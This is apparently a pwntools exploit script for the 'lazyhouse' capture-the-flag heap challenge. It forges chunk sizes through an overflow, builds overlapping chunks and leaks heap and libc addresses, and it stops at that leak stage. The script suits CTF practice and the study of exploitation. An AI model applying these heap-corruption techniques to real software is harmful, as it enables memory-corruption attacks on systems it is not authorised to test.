#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './lazyhouse1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')

def debug():
    gdb.attach(p)
    pause()

bps = [0x1C62,0x1D9E]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('Your choice: ')

def create(idx, size, content):
    eat()
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('House:')
    p.send(content)

def show(index):
    eat()
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(index))

def delete(index):
    eat()
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(index))

def edit(index, content):
    eat()
    p.sendline('4')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('House:')
    p.send(content)

# 遇到 bug
# int_overflow = (2 ** 64) // 218 + 1
# create(0,int_overflow,'123')

# leak_libc
for i in range(6):
    create(0,0x100,'index:0')
    delete(0)

for i in range(5):
    create(0,0x210,'index:0')
    delete(0)

create(0,0x100,'index:0')

create(1,0x100,'index:1')
create(2,0x100,'index:2')
create(3,0x100,'index:3')
create(4,0x100,'index:3')

create(5,0x100,p64(0) + p64(0x21) * 10)
create(6,0x100,'index:5=>protect')

edit(0,b'a' * 0x100 + p64(0) + p64(0x110 * 4 + 1))
delete(1)

create(1,0x430,(b'\x00' * 0x100 + p64(0) + p64(0x111)) * 3)# calloc 会清理数据，这里还原回去

delete(2)

delete(3)
debug()
show(1)

p.recv(0x110)
heap_base = u64(p.recv(6).ljust(8, b"\x00"))-0x7b0
log.success("heap_base: "+hex(heap_base))

p.recv(0x110+2-0x8)
libc.address = u64(p.recv(6).ljust(8, b"\x00"))-0x1e4ca0
log.success("libc.address: "+hex(libc.address))

delete(0)
delete(4)
delete(5)
delete(6)



p.interactive()